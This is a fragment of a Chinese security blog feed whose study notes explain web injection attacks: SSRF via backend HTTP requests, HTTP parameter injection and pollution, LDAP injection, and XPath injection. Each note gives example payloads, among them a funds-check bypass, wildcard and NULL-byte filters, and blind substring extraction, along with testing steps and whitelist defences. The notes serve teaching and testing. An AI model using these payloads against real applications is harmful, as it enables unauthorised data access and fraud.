    <url>/2019/03/26/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-4-%E6%B3%A8%E5%85%A5%E5%90%8E%E7%AB%AFHTTP%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<h1 id="注入HTTP后端请求"><a href="#注入HTTP后端请求" class="headerlink" title="注入HTTP后端请求"></a>注入HTTP后端请求</h1><p>影城程序可能会将用户输入嵌入任何类型的后端HTTP请求，包括哪些以常规名/值对传输参数的请求。由于应用程序通常会有效代理用户提交的UTL和参数，因而这种行为往往易于受到攻击。针对这种功能的攻击可以分为以下类别：</p>
<ul>
<li>服务端HTTP重新向：攻击者可以通过这种方式制定任意资源或URL，然后再由后端应用父亲为请求这些资源或URL。</li>
<li>HTTP参数注入（HPI）：攻击者可以通过这种方法在应用程序服务器提出的后端HTTP请求中注入任意参数。如果攻击者注入后端请求中已存在的参数，就可以利用HTTP参数污染（HPP）攻击覆盖服务器指定的原始参数值。</li>
</ul>
<h2 id="服务器HTTP重定向"><a href="#服务器HTTP重定向" class="headerlink" title="服务器HTTP重定向"></a>服务器HTTP重定向</h2><p>如果应用程序接受用户可控制的输入，并将其合并到使用后端HTTP请求检索的URL中，这种行为就会导致服务器端重定向漏洞。用户提交的输入中可能包含被检索的完整URL，或者应用程序可能会对该URL进行某种处理，如添加标准的后缀。</p>
<p>后端HTTP请求可能指定公公因特网上的某个域，或者指定用户无法直接访问的内部服务器。所请求的内容可能对应用程序的功能非常关键，如支付网关的接口；或者较为次要，如从第三方提取的内容。这种技巧常用于将几个单独的内部和外部应用程序组件结合到一个前端应用程序中，再由该应用程序代表这些组件实施访问控制和会话管理。如果攻击者能够控制后端HTTP请求中的IP地址或主机名，他就可以使应用程序服务器连接到任意资源，有时甚至能够检索后端响应的内容。</p>
<p>以下面的前端请求为例，其中的loc参数用于指定客户端希望查看的CSS文件的版本：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /account/home HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: wahh-blogs.net</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">view=default&amp;loc=online.wahh-blogs.net/css/wahh.css</span><br></pre></td></tr></table></figure>

<p>如果没有在loc参数中未URL指定确认机制，攻击者就可以指定任何主机名来替代online.wahh-blogs.net。应用陈故乡将检索指定的资源，导致攻击者将应用程序用作潜在的敏感后端服务的代理服务器。在下面的示例中，攻击者使应用程序连接到后端的SSH服务：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /account/home HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: wahh-blogs.net</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">view=default&amp;loc=192.168.0.1:22</span><br></pre></td></tr></table></figure>

<p>应用程序的响应包含所请求的SSH服务 的旗标：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">SSH-2.0-OpenSSH_4.2Protocol mismatch.</span><br></pre></td></tr></table></figure>

<p>攻击者可以利用服务器端HTTP重定向漏洞，将易受攻击的应用程序作为开放的HTTP代理服务器，以事实各种其他攻击。</p>
<ul>
<li>攻击者可以将该代理服务器用于攻击互联网上的第三方系统。恶意流量针对的是运行易受攻击的应用程序的服务器上的目标。</li>
<li>攻击者可以将该代理服务器用于连接到阻止内部网络中的任意主机，从而访问无法通过因特网直接访问的目标</li>
<li>攻击者可以将该代理服务器用于反向连接在应用程序服务器本身上运行的其他服务，从而突破防火墙限制，并利用新人关系来避开身份验证。</li>
<li>最后，攻击者可以通过使应用程序在响应中包含受控的内容，利用代理功能实现跨站点脚本等攻击。</li>
</ul>
<p>测试步骤：</p>
<ol>
<li>确定任何可能包含主机名、IP地址或完整URL的请求参数</li>
<li>对于每个参数，修改参数值以指定其他与所请求的资源类似的资源，并观察该资源是否会出现在服务器的响应中。</li>
<li>尝试指定一个针对你控制的额因特网服务器URL，并对该服务器进行监视，检查来自所测试的应用程序的传入连接。</li>
<li>如果没有收到任何传入连接，则监视应用程序响应所花费的时间。如果存在延迟，则说明应用程序的祸端请求可能由于出站连接上的网络限制导致超时。</li>
<li>如果成功利用相关功能连接到任意URL，则可以尝试实施以下攻击。<ol>
<li>确定是否可以制定端口号，例如，可以指定<a href="http://mdattacker.net:22" target="_blank" rel="noopener">http://mdattacker.net:22</a></li>
<li>如果可以指定端口号，尝试使用Burp Intruder等工具对内部网络进行端口扫描，以逐个连接到一系列IP地址和端口</li>
<li>尝试连接到应用程序服务器的回环地址上的其他服务，</li>
<li>尝试将受控的Web页面加载到应用程序的响应中，以实施跨站点脚本攻击。</li>
</ol>
</li>
</ol>
<h2 id="HTTP参数注入"><a href="#HTTP参数注入" class="headerlink" title="HTTP参数注入"></a>HTTP参数注入</h2><p>如果用户提交的参数被用作后端HTTP请求中的参数，这时就会导致HTTP参数注入。以下面的之前易于收SOAP注入的银行转账功能为例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /bank/48/Default.aspx HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430&amp;ToAccount=08447656&amp;Submit=Submit</span><br></pre></td></tr></table></figure>

<p>这个前端请求由用户的浏览器提出，将导致应用程序向银行基础架构中的另一台Web服务器提出其他HTTP请求。在以下后端请求中，应用程序从前端请求中复制了一些参数值：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /doTransfer.asp HTTP/1.0</span><br><span class="line">Host: mdsec-mgr.int.mdsec.net</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430&amp;ToAcc=08447656</span><br></pre></td></tr></table></figure>

<p>这个请求要求后端服务器检查时候有清算资金可以转账，如果有，则进行转账。但是，前端服务器可以通过提供以下参数，指定存在清算资金，从而避开上述检查：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">ClearedFunds=true</span><br></pre></td></tr></table></figure>

<p>如果攻击者发现这种行为，他就可以尝试实施HPI攻击，在后端请求中注入ClearedFunds参数。要注入该参数，他将所需参数附加到现有参数值的后面，并将分隔名称和值的&amp;和=字符进行URL编码，如下所示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /bank/48/Default.aspx HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430&amp;ToAccount=08447656%26clearedFunds%3dtrue&amp;Submit=Submit</span><br></pre></td></tr></table></figure>

<p>当应用服务器处理这个请求时，它会以正常方式对参数值进行URL解码。因此，前端应用程序受到的ToAccount参数值位</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">08447656&amp;ClearedFunds=true</span><br></pre></td></tr></table></figure>

<p>如果前端应用程序没有确认这个值并将它按原样传递给后端请求，应用程序将提出以下后端请求，使攻击者能工成功避开清算资金检查。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /doTransfer.asp HTTP/1.0</span><br><span class="line">Host: mdsec-mgr.int.mdsec.net</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430&amp;ToAcc=08447656&amp;ClearedFunds=true</span><br></pre></td></tr></table></figure>

<h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p>HPP是一种可用于各种环境下的攻击机巧，这种技巧常用在HPI攻击中。</p>
<p>如果请求中包含多个同名请求，这时Web服务器该如何处理？对于这一问题，HTTP规范并未提供任何指导。实际上，各种Web服务器的处理方式各不相同，以下是一些常见的处理方式。</p>
<ul>
<li>使用参数的第一个实例</li>
<li>使用参数的最后一个实例</li>
<li>串联参数值，可能在参数之间添加分隔符</li>
<li>构建一个包含所有请求值的数组</li>
</ul>
<p>在前面的HPI示例中，攻击者可以在后端请求中添加一个新的参数。实际上，攻击者可以对其实施注入攻击的请求很可能已经包含一个与攻击者所针对的参数同名的参数。在这种情况下，攻击者可以使用HPI条件注入另一个同名参数。随后，应用程序将表现出何种行为，将取决于后端HTTP服务器如何处理重复的参数。这样，攻击者获取可以用他注入的参数值“覆盖”原始参数值。</p>
<p>例如，如果原始的后端请求为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /doTransfer.asp HTTP/1.0</span><br><span class="line">Host: mdsec-mgr.int.mdsec.net</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">fromacc=18281008&amp;amount=1430&amp;clearedFunds=false&amp;toacc=08447656</span><br></pre></td></tr></table></figure>

<p>并且后端服务器使用任何重复的参数的第一个实例，则攻击者可以对前端请求中的FromAccount参数实施攻击，如下所示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /doTransfer.asp HTTP/1.0</span><br><span class="line">Host: mdsec-mgr.int.mdsec.net</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">FromAccount=18281008%26clearedFunds%3dtrue&amp;Amount=1430&amp;ToAccount=08447656</span><br></pre></td></tr></table></figure>

<p>相反，在这个示例中，如果后端服务器使用任何重复的参数的最后一个实例，则攻击者可以对前端请求中的ToAccount参数实施攻击。</p>
<p>HPP能否攻击成功，在很大程度上取决于目标应用服务器如何处理多个同名参数，以及后端请求中的插入点是否准确。如果两种技术需要处理相同的HTTP请求，HPP攻击就会造成严重的后果。Web应用程序防火墙或反向代理可能会处理某个请求，并将其传递给Web应用程序，由Web应用程序抛弃变量，甚至是基于之前不想管的请求部分构件字符串。</p>
<h3 id="攻击URL转换"><a href="#攻击URL转换" class="headerlink" title="攻击URL转换"></a>攻击URL转换</h3><p>许多服务器会在所请求的URL抵达时重写这些URL，再将它们映射到应用程序中的相关后端功能。除传统的URL重写外，服务器在处理REST风格的参数、定制导航包装器以及其他URL转换方法时都会进行URL重写。这种方式可能易受HPI和HPP攻击。</p>
<p>为了简化和便于导航，一些应用程序在URL的文件路径，而非查询字符串中插入参数值。通常，应用程序会通过一些简单的规则转换URL，然后将其转发给真正地目标。Apache中的以下mod_rewrite规则用于处理可公共访问的用户资料：</p>
<p><strong>RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /pub/user/[\&amp;]*\ HTTP/</strong></p>
<p><strong>RewriteRUle ^pub/user/([^/\\.]+)$ /inc/user_mgr.php?mode=view&amp;name=$1</strong></p>
<p>次规则接受非常简洁的请求，例如：</p>
<p><strong>/pub/user/marcus</strong></p>
<p>并将这些请求转换为后端请求，以便于用户管理页面user_mgr.php包含的view功能进行处理。例如，如果攻击者请求：</p>
<p><strong>/pub/user/marcus%26mode=edit</strong></p>
<p>将URL编码的值嵌入经过重写的URL中，将得到：</p>
<p><strong>/inc/user_mgr.php?mode=view&amp;name=marcus&amp;mode=edit</strong></p>
<p>讲HPP攻击的时候说到，这种攻击能否成功取决于服务器如何处理重复的参数。在PHP平台中，mode参数被视为具有值edit，因而攻击取得成功。</p>
<p>测试步骤：</p>
<ol>
<li><p>轮流针对每个请求参数进行测试，尝试使用各种语法添加一个心注入的参数：</p>
<ul>
<li>%26foo%3dbar——URL编码的&amp;foo=bar</li>
<li>%3bfoo%3dnar——URL编码的;foo=bar</li>
<li>%2526foo%253dbar——双重URL编码的&amp;foo=bar</li>
</ul>
</li>
<li><p>确定任何修改后不会改变应用程序的行为的参数示例（仅适用于在修改后会在应用程序的响应造成某种差异的参数）。</p>
</li>
<li><p>在上一步确定的每个实例都可以实施参数注入。尝试在请求的不同位置注入一个一致的参数，看这样做是否可以覆盖或修改现有的某个参数。例如：</p>
<p><strong>FromAccount=18281008%26Amount%3d4444&amp;Amount=1430&amp;ToAccount=08447656</strong></p>
</li>
<li><p>如果这样做会将现有值替换为心智，确定是否可以通过注入一个由后端服务器读取的值来避开任何前端确认机制。</p>
</li>
<li><p>用其他参数名称替换注入的已知参数。</p>
</li>
<li><p>测试应用程序是否允许在请求中多次提交同一个参数，在其他参数前后，以及请求的不同位置提交多余的值。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>HTTP请求</tag>
      </tags>
  </entry>
  <entry>
    <title>注入LDAP</title>
    <url>/2019/03/25/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/4-5%E6%B3%A8%E5%85%A5LDAP/</url>
    <content><![CDATA[<h1 id="注入LDAP"><a href="#注入LDAP" class="headerlink" title="注入LDAP"></a>注入LDAP</h1><p>LDAP（LightWeight Directory Access Protocol， 轻量级目录访问协议）用于访问网络中的目录服务。目录是一个分级结构的数据存储区，其中可能包含任何类型的信息，但常用于保存个人信息，如姓名、电话号码、电子邮件地址和工作职能等。Windows域中使用的Active Directory就是这种目录的一个典型示例。LDAP还常用在企业内联网Web应用程序中，如允许用户查看并修改雇员信息的人力资源应用程序。</p>
<p>每个LDAP查询使用一个或多个搜索过滤器，它们决定了请求返回的目录项。搜索过滤器可以使用各种逻辑运算符来表示复杂的搜索条件。最常用的搜索过滤器如下。</p>
<ul>
<li><p><strong>简单匹配条件</strong>对单个属性的值进行匹配。例如，通过用户名搜索用户的应用程序可能使用以下过滤器：</p>
<p><strong>（username=daf）</strong></p>
</li>
<li><p><strong>析取查询</strong>指定多个条件，返回的目录项必须满足其中任何一个条件。例如，在多个目录属性中查找用户提供的搜索项的搜索函数可能使用以下过滤器：</p>
<p><strong>(|(cn=searchterm) (sn=searchitem)(ou=searchterm))</strong></p>
</li>
<li><p><strong>合取查询</strong>指定多个条件，返回的目录项必须满足所有这些条件。例如，LDAP中实施的登录机制可能使用以下过滤器：</p>
<p><strong>(&amp;(username=daf)(password=secret))</strong></p>
</li>
</ul>
<p>和其他形式的注入一样，如果用户提交的输入不经任何确认即被插入到LDAP搜索过滤器中，攻击者就可以通过提交专门设计的输入来修改过滤器的结构，以检索数据或执行未授权操作。</p>
<p>一般而言，与SQL注入漏洞相比，LDAP注入漏洞更难以被攻击者利用，原因如下。</p>
<ul>
<li>搜索过滤器采用逻辑运算符来指定析取或合取查询的位置通常位于用户提交数据的插入位置之前，因而无法被修改。因此，简单匹配条件和合取查询不会受与SQL注入类似的“ or 1=1”类型的攻击。</li>
<li>在常用的LDAP服务中，范湖IDE目录属性将作为搜索过滤器中的独立参数传递个LDAP API，并且通常在应用程序中进行了硬编码。因此，攻击者无法通过修改用户提交的输入来检索与查询检索的属性不同的属性。</li>
<li>应用程序很少返回有用的错误消息，因此，通常攻击者只能“盲目”利用各种漏洞。</li>
</ul>
<h2 id="利用LDAP注入"><a href="#利用LDAP注入" class="headerlink" title="利用LDAP注入"></a>利用LDAP注入</h2><p>尽管存在上述限制，但在许多情况下，攻击者仍然可以利用LDAP注入漏洞从应用程序中获取数据，或执行未授权操作。通常，实施这类攻击的方法与搜索过滤器的结构、用户输入的进入点，以及后端LDAP服务本身的执行细节密切相关。</p>
<h3 id="析取查询"><a href="#析取查询" class="headerlink" title="析取查询"></a>析取查询</h3><p>以允许用户查看指定业务部门的雇员的应用程序为例。其搜索结果仅限于用户获得授权可以查看的地理区域。例如，如果一名用户获得授权可以查看伦敦和雷丁区域，并且他搜索的是“销售”部门，应用程序将执行以下析取查询：</p>
<p><strong>(|(department=London sales)(department=Reading sales))</strong></p>
<p>这里应用程序构建了一个析取查询，并在用户提交的输入之前前置了一些表达式来执行所需的访问控制。</p>
<p>在这种情况下，攻击者可以通过提交以下搜索项对查询进行修改，以返回所有地区的所有雇员的资料：</p>
<p><strong>)(department=*</strong></p>
<p>*字符是LDAP中的通配符，可匹配任何数据项。如果将这个输入嵌入LDAP搜索过滤器中，应用程序将执行以下查询：</p>
<p><strong>(|(department=London )(department=*)(department=Reading )(department=*))</strong></p>
<p>由于这是一个析取查询并且包含通配符搜索项，因此，它会对所有目录项进行匹配。它会返回所有地区的所有员工的资料，从而突破应用程序的访问控制。</p>
<h3 id="合取查询"><a href="#合取查询" class="headerlink" title="合取查询"></a>合取查询</h3><p>这里我们以另一个类似的应用程序为例，同样，该应用程序允许用户按姓名在授权查看的地理区域内搜索雇员。</p>
<p>如果用户获得授权可以在伦敦进行搜索，并且他搜索姓名daf，则应用程序将执行以下查询：</p>
<p><strong>(&amp;(giveName=daf)(department=London*))</strong></p>
<p>这里，用户的输入被插入到合取查询中，该查询的第二部分仅通过匹配其中一个伦敦部门的数据项来执行所需的访问控制。</p>
<p>在这种情况下，根据后端LDAP服务的执行细节，攻击者可以成功实施两种类型的攻击。一些LDAP允许批量使用多个搜索过滤器，并且选择性地应用这些过滤器（换言之，应用程序将返回与任意过滤器匹配的目录项）例如，攻击者可以提交以下输入：</p>
<p><strong>*))(&amp;giveName=daf</strong></p>
<p>如果将这个输入嵌入原始搜索过滤器中，将得到以下查询：</p>
<p><strong>(&amp;(giveName=*))(&amp;giveName=daf)(department=London*)</strong></p>
<p>现在，这个查询中包含两个搜索过滤器，第一个过滤器包含一个通配符匹配条件。因此，应用程序将返回所有地区的所有雇员的资料，从而避开了应用程序的访问控制。</p>
<p>第二种针对合取查询的额共计利用许多LDAP服务在处理NULL字节方面存在的漏洞。由于这些服务通常以本地代码编写，因此，搜索过滤器中的NULL字节将立即终止字符串，NULL之后的任何字符将被忽略。虽然LDAP本身并不支持注释，但是，攻击者可以利用它在处理NULL字节上的这个漏洞，从而“注释掉”查询的剩余部分。</p>
<p>在前一个示例中，攻击者可以提交以下输入：</p>
<p><strong>*))%00</strong></p>
<p>应用程序服务器会将%00序列解码成原义NULL字节，因此，如果将以上输入嵌入到搜索过滤器中，查询将变为：</p>
<p><strong>(&amp;(giveName=<em>))[NULL](department=London\</em>)</strong></p>
<p>由于这个过滤器在NULL字节处被截短，在LDAP看来，其中只包含一个通配符条件，因此，应用程序还会返回伦敦地区以外的部门的所有雇员资料。</p>
<h3 id="查找LDAP注入漏洞"><a href="#查找LDAP注入漏洞" class="headerlink" title="查找LDAP注入漏洞"></a>查找LDAP注入漏洞</h3><p>向一项LDAP操作提交武侠ode输入并不会生成任何详细的错误消息。通常，由搜索功能返回的结果和发生的错误都有助于确定漏洞。但是，可以使用以下步骤相对可靠的确定LDAP注入漏洞。</p>
<ol>
<li><p>尝试仅输入*字符作为搜索项。在LDAP中，这个字符是一个通配符，但在SQL中不是，如果返回大量结果，这种情况明显表示攻击针对的是一个LDAP查询</p>
</li>
<li><p>尝试输入大量的闭括号：</p>
<p><strong>)))))))</strong></p>
<p>这个输入将结束任何括住输入、以及那些包含主查询过滤器的括号，导致无法匹配的闭括号，因而破坏查询的语法。如果发生错误，应用程序就易于受到LDAP注入。</p>
</li>
<li><p>尝试输入各种旨在干扰不同类型的查询的表达式，并看是否可以通过这些表达式来影响返回的结果。所有LDAP均支持cn属性，如果对所查询的目录一无所知，使用该属性会大有用处。例如：</p>
<p><strong>)(cn=*</strong></p>
<p><strong><em>))(|(cn=\</em></strong></p>
<p><strong>*))%00</strong></p>
<h3 id="防止LDAP注入"><a href="#防止LDAP注入" class="headerlink" title="防止LDAP注入"></a>防止LDAP注入</h3><p>如果有必要在一个LDAP查询中插入用户提交的输入，也只提交可事实严格输入确认的简单数据。应根据一份可接受字符“白名单”检查用户输入，其中最好只包括字母数字字符。应组织任何可能破坏LDAP查询的字符，包括 ( ) ; , * | &amp; = 和空字节。拒绝任何与白名单不匹配的输入，不要净化。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>LDAP</tag>
      </tags>
  </entry>
  <entry>
    <title>注入XPath</title>
    <url>/2019/03/25/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/4-4%E6%B3%A8%E5%85%A5XPath/</url>
    <content><![CDATA[<h1 id="注入XPath"><a href="#注入XPath" class="headerlink" title="注入XPath"></a>注入XPath</h1><p>XPath（XML路径语言）是一种利用与导航XML文档并从中获取数据的解释型语言。许多时候一个XPath表达式代表由一个文档节点导航到另一个文档节点所需要的一系列步骤。</p>
<p>如果Web应用程序将数据保存在XML文档中，那么它们可能使用XPath访问数据，以响应用户提交的输入。如果这个输入未经任何过滤或净化就插入到XPath查询中，攻击者就可以通过控制查询来破坏应用程序的逻辑，或者获取未授权访问的数据。</p>
<p>通常，XML文档并不是保存企业数据的首选工具。但是，它们常常被用于保存可根据用户输入获取的应用程序配置数据。小型应用程序也可使用它们保存简单的信息，如用户证书、角色和权限。以下面的XML数据为例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">addressBook</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">firstName</span>&gt;</span>William<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">surname</span>&gt;</span>Gates<span class="tag">&lt;/<span class="name">surname</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>MSRocks!<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>billyg@microsoft.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ccard</span>&gt;</span>5130 8190 3282 3515<span class="tag">&lt;/<span class="name">ccard</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">firstName</span>&gt;</span>Chris<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">surname</span>&gt;</span>Dawes<span class="tag">&lt;/<span class="name">surname</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>secret!<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>cdawes@craftnet.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ccard</span>&gt;</span>3981 2491 3241 3121<span class="tag">&lt;/<span class="name">ccard</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">firstName</span>&gt;</span>James<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">surname</span>&gt;</span>Hunter<span class="tag">&lt;/<span class="name">surname</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>letmein<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>james.hunter@pookmail.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ccard</span>&gt;</span>8113 8320 8014 3313<span class="tag">&lt;/<span class="name">ccard</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">addressBook</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一个获取所有电子邮件地址的XPath查询如下：</p>
<p><strong>//address/email/text()</strong></p>
<p>一个返回Dawes的全部用户资料的查询为：</p>
<p><strong>//address[surname/text() = ‘Dawes’]</strong></p>
<p>在一些应用程序中，用户提交的数据可被直接嵌入到XPath查询中，查询的结果可能在应用程序的响应中返回，或者用于决定应用程序某些方面的行为。</p>
<h3 id="破坏应用程序逻辑"><a href="#破坏应用程序逻辑" class="headerlink" title="破坏应用程序逻辑"></a>破坏应用程序逻辑</h3><p>以一个根据用户名和密码获得用户保存的信用卡号码的应用程序功能为例。下面的XPath查询核实用户提交的整数，并获取相关用户的信用卡号码：</p>
<p><strong>//address[surname/text()=’Dawes’ and password/text() = ‘secret’]/ccard/text()</strong></p>
<p>与利用SQL注入漏洞一样，这时攻击者也可以破坏应用程序的查询。例如，提交密码值</p>
<p><strong>‘ or ‘a’=’a</strong></p>
<p>将导致下面的XPath查询，获取所有用户的信用卡信息：</p>
<p><strong>//address[surname/text() = ‘Dawes’ and password/text() = ‘’ or ‘a’ = ‘a’]/ccard/text()</strong></p>
<p>另外，与SQL注入一样，注入一个数字值时不需要单引号。但与SQL查询不同，XPath查询中的关键字区分大小写，XML文档中的元素名也区分大小写。</p>
<h3 id="谨慎XPath注入"><a href="#谨慎XPath注入" class="headerlink" title="谨慎XPath注入"></a>谨慎XPath注入</h3><p>攻击者可利用Xpath注入漏洞从目标XML文档中获取任意信息。获取信息的一种可靠途径是使用和上述SQL注入时相同的技巧，促使应用程序根据攻击者指定的条件以不同的方式作出响应。</p>
<p>提交以下两个密码将导致应用程序的不同行为：第一种情况返回结果，但第二种情况不返回结果。</p>
<p><strong>‘ or 1 = 1 and ‘a’ = ‘a</strong></p>
<p><strong>‘ or 1 = 2 and ‘a’ = ‘a</strong></p>
<p>这种行为差异可用于测试任何特殊条件的真假，因此可通过它依次第一个字节地提取出任意信息。与SQL一样，XPath语言也包含一个子字符串函数，可用它依次一个字符地测试一个字符串的值。例如，提交密码</p>
<p><strong>‘ or //address[surname/text()=’Gates’ and substring(password/text(), 1, 1) = ‘M’] and ‘a’ = ‘a</strong></p>
<p>将导致下面的XPath查询，如果用户Gates密码的第一个字符为M，将返回查询结果：</p>
<p><strong>//address[surname/text()=’Dawes’ and password/text() = ‘’ or //address[surname/text() = ‘Gates’ and substring(password/text(), 1, 1) = ‘M’] and ‘a’ = ‘a ‘]/ccard/text()</strong></p>
<p>轮流针对每个字符为止并测试每个可能的值，攻击者就能够获得Gate的完整密码。</p>
<h3 id="盲目XPath注入"><a href="#盲目XPath注入" class="headerlink" title="盲目XPath注入"></a>盲目XPath注入</h3><p>在前面的攻击中，注入的测试条件指定了提取数据的绝对路径以及目标字段的名称。实际上，即使不了解这些信息，攻击者仍有可能发动完全盲目的攻击。Xpath查询可包括与XML文档中当前节点的有关步骤，因此，从当前节点可以导航到父节点或一个特定的子节点。另外，XPath包含可查询文档原信息（包含特殊元素的名称）的函数。使用这些技巧就可以提取出文档中所有节点的名称与之，而不必提前知道与它的结构或内容有关的任何信息。</p>
<p>例如，可以使用前面描述的子字符串技巧，通过提交如下格式的密码，提取当前节点的父节点名称：</p>
<p><strong>‘ or substring(name(parent::*[position() = 1]), 1, 1) = ‘a</strong></p>
<p>这个输入能够返回结果，因为address节点的第一个字母为a。轮到第二个字母，这时可以提交下列密码确定该字母为d，因为最后一个输入返回了结果：</p>
<p><strong>‘ or substring(name(parent::*[position()=1]),2,1) = ‘a</strong></p>
<p><strong>‘ or substring(name(parent::*[position()=1]),2,1) = ‘b</strong></p>
<p><strong>‘ or substring(name(parent::*[position()=1]),2,1) = ‘c</strong></p>
<p><strong>‘ or substring(name(parent::*[position()=1]),2,1) = ‘d</strong></p>
<p>确定address节点的名称后，攻击者就可以轮流攻击他的每一个子节点，提取出它们的名称与值。通过索引指定相关子节点可不必知道任何节点的名称。例如，下面的查询将返回值Hunter：</p>
<p><strong>//address[position() = 3]/child::node()[position*() = 4]/text()</strong></p>
<p>而下面的查询返回值letmein：</p>
<p><strong>//address[position() = 3]/child::node()[position*() = 6]/text()</strong></p>
<p>这种技巧可用在完全盲目的攻击中，这时应用程序在响应中不返回任何结果，我们可以设计一个注入的条件，通过索引指定目标节点。例如，如果Gates密码的第一个字母为M，提交下面的密码将返回结果：</p>
<p><strong>‘ or substring (//address[position()=1]/child::node()[position() = 6]text(), 1, 1) = ‘M’ and ‘a’ = ‘a</strong></p>
<p>轮流攻击每个地址节点的每个子节点，并以此一个字符地提取出它们的值，攻击者就可以提取整个XML数据的内容。</p>
<h3 id="查找XPath注入漏洞"><a href="#查找XPath注入漏洞" class="headerlink" title="查找XPath注入漏洞"></a>查找XPath注入漏洞</h3><p>许多常用于探查SQL注入漏洞的攻击字符串如果被提交给一个易于受到XPath注入的函数，往往会导致反常行为。例如，下面的两个字符会破坏XPath查询的语法，从而造成错误：</p>
<p><strong>‘</strong></p>
<p><strong>‘–</strong></p>
<p>通常，与在SQL注入漏洞中一样，下面的一个或几个字符串将会引起应用程序的行为发生变化，但不会造成错误：</p>
<p><strong>‘ or ‘a’ = ‘a</strong></p>
<p><strong>‘ and ‘ a’ = ‘b</strong></p>
<p><strong>or 1 = 1</strong></p>
<p><strong>and 1=2</strong></p>
<p>因此，任何时候，如果在探查SQL注入过程中发现一个漏洞的初步证据，但却无法对该漏洞加以利用，那么遇到的可能就是XPath注入漏洞。</p>
<h3 id="防止XPath注入"><a href="#防止XPath注入" class="headerlink" title="防止XPath注入"></a>防止XPath注入</h3><p>如果觉得必须在一个XPath查询中插入用户提交的输入，应该只提交可事实严格输入确认的简单数据。应根据一份可接受字符组成的“白名单”检查用户输入，其中最好只包括字母数字字符。应阻止任何可能破坏XPath查询的字符，包括( ) = ‘ [ ] : , * / 和所有空白符。直接拒绝而不是净化任何与白名单不匹配的输入。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>XPath</tag>
      </tags>
  </entry>
